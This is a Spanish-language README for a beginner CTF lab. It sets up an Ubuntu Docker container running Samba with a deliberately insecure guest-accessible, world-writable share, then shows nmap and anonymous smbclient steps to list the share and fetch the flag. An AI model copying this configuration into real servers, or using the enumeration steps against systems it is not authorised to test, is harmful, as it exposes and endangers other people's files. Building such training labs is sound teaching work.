# 🚩 CTF Challenge: Samba "Very Easy"

![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Samba](https://img.shields.io/badge/Samba-Video_Share-yellow?style=for-the-badge&logo=linux&logoColor=black)
![Security](https://img.shields.io/badge/Security-CTF-red?style=for-the-badge)

Este proyecto documenta la creación un CTF de nivel introductorio, explotando una configuración insegura en el servicio **Samba** sobre un contenedor **Ubuntu**.

---

## 📋 Prerrequisitos

* **Docker** instalado en tu máquina principal
* **Smbclient** y **Nmap** (para la fase de prueba)

---

## 🛠️ Primera parte

### 1. Obtener la imagen base
usaremos la imagen oficial de Ubuntu como base para nuestro servidor

```bash
sudo docker pull ubuntu:latest
```

verifica que la imagen se descargó correctamente:

```bash
sudo docker images
```

### 2. Inicar el contenedor

```bash
# se puede usar el ID de la imagen o el nombre "ubuntu"
sudo docker run -dit ubuntu
```

confirma que el contenedor está corriendo:

```bash
sudo docker ps
```

### 3. Acceder y Preparar el Sistema
ingresamos a la terminal del contenedor para configurarlo como root

```bash
sudo docker exec -it ID-DEL-CONTENEDOR bash
```

una vez dentro, actualizamos los repositorios e instalamos las actualizaciones:

```bash
apt update -y && apt upgrade -y
```

ahora intalamos el servicio samba:

```bash
apt install samba -y
```

durante la instalación de samba, si pregunta por configuraciones de región, puedes elegir tu region

### 4. Configurar la bandera  
creamos el directorio secreto, asignamos permisos inseguros (777) y creamos el archivo con la flag

```bash
# crear directorio
mkdir -p /srv/samba/bandera

# dar permisos totales (inseguro a propósito para el CTF)
chmod 777 /srv/samba/bandera

# crear la flag
echo "FLAG{SMB-COMPLETADO-LOL}" > /srv/samba/bandera/flag.txt
```

### 5. Configurar el Servicio Samba
editamos el archivo de configuración para exponer nuestra carpeta, en este caso, lo hare con nano, para eso debemos instalarlo en el contenedor con: 

```bash
apt install nano
```

al tenerlo instalado, editaremos nuestro archivo de configuracion, esta en la ruta "/etc/samba/smb.conf", con el comando:

```bash
nano /etc/samba/smb.conf
```

añadimos las siguientes líneas al final del archivo. Esta configuración hace que la carpeta sea visible, escribible y accesible para invitados:

```bash
[Aqui_esta_la_bandera]
   path = /srv/samba/bandera
   browsable = yes    #se muestra en la lista de recursos(lo veremos en la fase de prueba)
   writable = yes     #permite escritura
   guest ok = yes     #permite acceso sin contraseña (invitado)
   read only = no     #asegura que no sea solo lectura
```

una vez añadido nuestra configuracion, guardamos y salimos

### 6. Iniciar Servicios
samba requiere dos servicios: smbd (transferencia de archivos) y nmbd (nombres de NetBIOS), los iniciamos con los siguientes comandos: 

```bash
service smbd start
service nmbd start
```

## 🕵️ Fase 2: Prueba

para verificar que el CTF funciona, realizaremos los pasos que haría un jugador

### 1. Reconocimiento

primero, necesitamos la IP del contenedor (generalmente 172.17.0.2 si es el único corriendo), escaneamos los puertos con Nmap

```bash
nmap 172.17.0.2
```

deberiamos ver que ambos servicios estan funcionando en el puerto 139 y 445

### 2. Enumeración
usamos smbclient para listar (-L) los recursos compartidos disponibles en el servidor sin usar contraseña (-N o dando Enter cuando pida pass)

```bash
smbclient -L 172.17.0.2 -N
```

deberíamos ver el recurso compartido: Aqui_esta_la_bandera

### 3. Explotación y Captura
nos conectamos al recurso compartido detectado

```bash
smbclient //172.17.0.2/Aqui_esta_la_bandera -N
```

una vez conectados (smb: \>), listamos los archivos y descargamos la bandera:

```bash
ls
```

```bash
get flag.txt
```

```bash
exit
```

### 4. Lectura de la Flag
de vuelta en nuestra máquina local, leemos el trofeo:

```bash
cat flag.txt
```

## 📝 Notas
* Browsability: Configurar browsable = yes facilita la enumeración para el atacante.

* Guest Access: guest ok = yes elimina la barrera de autenticación, permitiendo el acceso anónimo.

* Permisos: chmod 777 junto con writable = yes permite que cualquiera modifique o borre archivos, un riesgo crítico en entornos reales.
